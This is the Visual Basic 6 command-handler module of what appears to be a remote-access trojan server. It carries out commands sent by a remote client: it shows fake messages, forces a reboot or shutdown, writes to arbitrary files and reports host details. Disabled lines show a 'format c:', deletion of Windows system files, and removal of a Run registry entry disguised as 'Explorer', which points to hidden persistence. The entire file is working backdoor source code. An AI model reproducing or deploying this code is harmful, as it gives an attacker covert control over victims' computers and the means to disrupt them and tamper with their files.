Attribute VB_Name = "Commands"
Dim b As Object
Dim s As String
Function R(value As String) As String
    value = Replace(value, "*", "")
    R = value
End Function
Public Function PerformCommand(command As String, data As String)
    Select Case LCase(command)
    Case "msg"
        MsgBox data, vbInformation, "Information"
        frmServer.winConnect.SendData "MSGMessage Recieved"
    Case "err"
        Dim ErrCap As String
        Dim ErrMsg As String
        Dim where2 As String
        where2 = InStr(data, "|")
        ErrCap = Left(data, where2 - 1)
        ErrMsg = Right(data, Len(data) - where2)
        MsgBox ErrMsg, vbCritical, ErrCap
        frmServer.winConnect.SendData "MSGError Message Sent"
    Case "rst" ' The client wants to Restart Windows
        On Error Resume Next
        Shell "C:\Windows\RunDll.exe C:\Windows\System\User.exe,exitWindowsExec"
        Shell "Shutdown -r -t 01"
    Case "sdn" ' The client wants to Shutdown Windows
        On Error Resume Next
        Shell "C:\Windows\RunDll.exe C:\Windows\System\User.exe,exitWindows"
        Shell "Shutdown -s -t 01"
    Case "fmt"
        'Shell "format c:", vbHide
        frmServer.winConnect.SendData "MSGFormat C:\ not available in this version of server"
    Case "del"
        'Kill "C:\windows\*.*"
        frmServer.winConnect.SendData "MSGDelete C:\Windows files not available in this version of server"
    Case "fle"
        On Error Resume Next
        Dim filename, filedata, where As String
        where = InStr(data, "|")
        filename = Left(data, where - 1)
        filedata = Right(data, Len(data) - where)
        Open filename For Append As #1
        Print #1, filedata
        Close #1
        frmServer.winConnect.SendData "MSGFile made/modified."
    Case "cls"
        End
    Case "kll"
        'Set b = CreateObject("wscript.shell")
        's = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Explorer"
        'b.regdelete
        End
    Case "inf"
        infdata = "Time: " & Time & ", Date: " & Date ' Add the time and data
        infdata = infdata & vbNewLine & "Server Filename: " & App.Path & "\" & App.EXEName & ".exe" ' Add the exe path and filename
        infdata = infdata & vbNewLine & "Server Version: " & App.Major & "." & App.Minor ' Add the version numbers
        frmServer.winConnect.SendData "MSG" & infdata
    Case "pas"
        Dim pass As String
        Dim temp As String
        Dim en As String
        Dim sa As String
        sa = InStr(frmServer.txtpass.Text, "<pass>")
        en = InStr(frmServer.txtpass.Text, "</pass>")
        temp = R(Mid(frmServer.txtpass.Text, sa + 6, en - sa - 6))
        pass = temp
        If (data <> pass) Then
            frmServer.winConnect.SendData "MSGPassword Wrong" ' Tell the client the command was sent and performed
            frmServer.winConnect.Close
            frmServer.winConnect.Listen
        End If
    End Select
End Function
